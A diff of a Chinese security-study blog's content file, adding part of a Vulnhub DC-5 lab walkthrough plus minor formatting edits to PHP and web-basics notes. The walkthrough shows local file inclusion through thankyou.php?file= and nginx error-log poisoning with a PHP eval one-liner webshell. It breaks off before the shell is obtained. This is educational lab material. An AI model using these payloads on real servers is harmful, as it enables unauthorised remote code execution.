@@ -505,7 +505,7 @@ TCP/IP套接字；
 
 
 <hr>
-<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。</p>
+<h5 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h5><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在<code>序列化</code>和<code>反序列化</code>过程是不会触发的。</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>运行结果：</p>
@@ -1518,8 +1518,79 @@ handler 指向RequestHandler
 <p><strong>一个旗子找完，游戏结束</strong></p>
 <hr>
 <h1 id="五、DC-5-中级-高级"><a href="#五、DC-5-中级-高级" class="headerlink" title="五、DC-5[中级/高级]"></a>五、DC-5[中级/高级]</h1><p><strong>only one flag</strong></p>
+<p>官方文档里有一些提示说明，我们可以先看一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">As</span> far <span class="keyword">as</span> I am aware, there <span class="keyword">is</span> <span class="keyword">only</span> one exploitable entry <span class="type">point</span> <span class="keyword">to</span> <span class="keyword">get</span> <span class="keyword">in</span> (there <span class="keyword">is</span> <span class="keyword">no</span> SSH either). This particular entry <span class="type">point</span> may be quite hard <span class="keyword">to</span> identify, but it <span class="keyword">is</span> there. You need <span class="keyword">to</span> look <span class="keyword">for</span> something a little <span class="keyword">out</span> <span class="keyword">of</span> the ordinary (something that changes <span class="keyword">with</span> a <span class="keyword">refresh</span> <span class="keyword">of</span> a page). This will hopefully provide <span class="keyword">some</span> kind <span class="keyword">of</span> idea <span class="keyword">as</span> <span class="keyword">to</span> what the vulnerability might involve.</span><br><span class="line"></span><br><span class="line"><span class="keyword">And</span> just <span class="keyword">for</span> the <span class="type">record</span>, there <span class="keyword">is</span> <span class="keyword">no</span> phpmailer exploit involved. :-)</span><br><span class="line">翻译：</span><br><span class="line">据我所知，只有一个可利用的入口点可以进入（也没有 SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望为漏洞可能涉及的内容提供某种想法。</span><br><span class="line"></span><br><span class="line">只是为了记录，没有涉及 phpmailer 漏洞利用。:-)</span><br><span class="line"></span><br><span class="line">==&gt;大致关键的信息就是，在我们刷新网页的时候有的东西会发生改变，对应某种漏洞</span><br></pre></td></tr></table></figure></div>
+
 <p>养成习惯，先顺手用<code>nmap</code>扫一下靶机端口运行的服务信息</p>
 <p><img src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p>
+<p>发现<code>80</code>端口正常运行着<code>http</code>，<code>54235</code>端口打开</p>
+<hr>
+<p>我们访问<code>192.168.133.143</code></p>
+<p>先习惯看看<code>Wappalyzer</code>基本信息</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
+<p>发现<code>Web server</code>是<code>Nginx</code></p>
+<p>发现有5个窗口</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930190329914.png" alt="image-20220930190329914"></p>
+<p>挨个访问，看看有没有可以利用或者交互的地方</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930185231350.png" alt="image-20220930185231350"></p>
+<p><img src="/2022/08/29/vulnhub/image-20220930191004048.png" alt="image-20220930191004048"></p>
+<p>发现<code>Concat</code>窗口下有个输入框，可以实现交互效果，我们乱输入一些数据先试试</p>
+<p>看看变化</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930191023866.png" alt="image-20220930191023866"></p>
+<p>发现<code>url</code>在提交时发生的跳转，并且显示了一些信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.143</span>/thankyou.php?firstname=<span class="number">1</span>&amp;lastname=<span class="number">2</span>&amp;country=australia&amp;subject=<span class="number">123</span></span><br></pre></td></tr></table></figure></div>
+
+<p>看得出来，网站跳转到了<code>thankyou.php</code>，而且我们输入的信息也被以明文方式显示出来了</p>
+<p>那怎么利用呢？</p>
+<p>我们想起之前作者给的提示，说<strong>刷新的时候会发生变化</strong>，我们刷新看看</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930191944460.png" alt="image-20220930191944460"></p>
+<p><img src="/2022/08/29/vulnhub/image-20220930191958402.png" alt="image-20220930191958402"></p>
+<p>对比两个图可以发现，底下的年份时间发生了改变，<strong>刷新一次，增加一年</strong></p>
+<p>这个肯定是有用的，但是怎么利用还是不知道</p>
+<p>我们先要了解这个变化肯定是有文件来调用的，而我们肯定是可以访问这个文件的，那我们就需要再次针对性的进行信息收集</p>
+<p>用经典的<code>dirsearch</code>来扫一下</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930193121068.png" alt="image-20220930193121068"></p>
+<p>除去我们已经访问过的文件和响应码403的，发现有一个叫做<code>footer.php</code>文件，刚好和我们的发现变化的那个地方一致，也是<code>底部文本</code>变化</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/footer.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20220930193446746.png" alt="image-20220930193446746"></p>
+<p>发现果然是我们发现变化的那个地方，而且我们刷新时，也会同时变化</p>
+<hr>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>所以按上面我们推到的思路，和信息的收集，</p>
+<p><code>concat.php</code>的底部为了显示和<code>footer.php</code>的实现功能，肯定是实现了文件包含，</p>
+<p><code>concat.php</code>把<code>footer.php</code>文件包含了</p>
+<p>==&gt;我们渗透的基础思路就变成了<strong>利用的文件包含   拿到shell</strong></p>
+<h3 id="1-验证我们的想法"><a href="#1-验证我们的想法" class="headerlink" title="1.验证我们的想法"></a>1.验证我们的想法</h3><p>【文件包含一般变量为file，当然如果出现怎么都不行的，那就可以用爆破或者我们的思路错误了】</p>
+<p>我们先试试能不能包含<code>index.php</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p>
+<p>发现<code>index.php</code>确实被我们成功包含了，那我们就可以肯定我们的思路是没有偏离了</p>
+<h3 id="2-利用文件包含拿shell"><a href="#2-利用文件包含拿shell" class="headerlink" title="2.利用文件包含拿shell"></a>2.利用文件包含拿shell</h3><p>既然能够在<code>thank.php</code>里实现文件包含，那我们就试试能不能包含一些敏感文件，来获取更多信息</p>
+<h4 id="1）向Nginx错误日志导入一句话🐎"><a href="#1）向Nginx错误日志导入一句话🐎" class="headerlink" title="1）向Nginx错误日志导入一句话🐎"></a>1）向Nginx错误日志导入一句话🐎</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Nginx访问日志：网站访问者有关的活动都记录在访问日志 <span class="regexp">//</span>access_log</span><br><span class="line"></span><br><span class="line">Nginx错误日志：当访问错误的时候，会把错误参数保存在其中  <span class="regexp">//</span>error_log</span><br></pre></td></tr></table></figure></div>
+
+<p>所以我们在我们的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">url/?<span class="built_in">file</span>= 的后面加上一句话🐎，</span><br><span class="line">然后因为访问错误，错误参数【一句话🐎】就会到nginx的错误日志中，</span><br><span class="line">然后利用我们发现的文件包含把错误日记包含在thankyou.php文件中，</span><br><span class="line">访问拿到<span class="built_in">shell</span>，拿到<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><em><code>nginx</code>配置文件位置：</em><em>/etc/nginx/nginx.conf</em>*</p>
+<p>我们包含该文件看看<strong>nginx的错误日志文件</strong>位置在哪里</p>
+<p><img src="/2022/08/29/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p>
+<p>看到文件位置</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">error_log：<span class="regexp">/var/</span>log<span class="regexp">/nginx/</span>error.log</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>先输入一句话🐎，报错导入<code>nginx</code>错误日志</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://192.168.133.143/thankyou.php?file=%3C?php%20@eval($POST</span>[<span class="string">%22cmd%22</span>]);?%3E</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20220930223122784.png" alt="image-20220930223122784"></p>
+<p>访问</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span><span class="regexp">/thankyou.php?file=/</span>var<span class="regexp">/log/</span>nginx/error.log</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20220930223101819.png" alt="image-20220930223101819"></p>
+<p>发现成功包含进去了，那我们尝试拿<code>shell</code></p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
@@ -1617,11 +1688,12 @@ handler 指向RequestHandler
 <hr>
 <h2 id="DAY4-基础入门-WEB源码拓展"><a href="#DAY4-基础入门-WEB源码拓展" class="headerlink" title="DAY4 基础入门-WEB源码拓展"></a>DAY4 基础入门-WEB源码拓展</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
 <p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
-<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p>admin：后台文件目录</p>
-<p>data：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
-<p>include：数据库目录</p>
-<p>template；网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
-<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型<code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
+<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p><code>admin</code>：后台文件目录</p>
+<p><code>data</code>：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
+<p><code>include</code>：数据库目录</p>
+<p><code>template</code>：网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
+<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型</p>
+<p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
 <p>当看到网站的脚本格式时，就大致可以猜测到大概容易出现什么漏洞，</p>
 <p>因为网站源码语言和应用不同，编写的方式也不同，出现的问题也就不同，从而针对性的寻找或修复漏洞，节约时间，提高效率</p>
 <h3 id="3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"><a href="#3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞" class="headerlink" title="3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"></a>3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞</h3><h3 id="4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"><a href="#4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等" class="headerlink" title="4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"></a>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</h3><p>CMS：内容管理系统（content management system，CMS），是一种位于WEB前端（Web  服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>以及<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>网站的信息。</p>
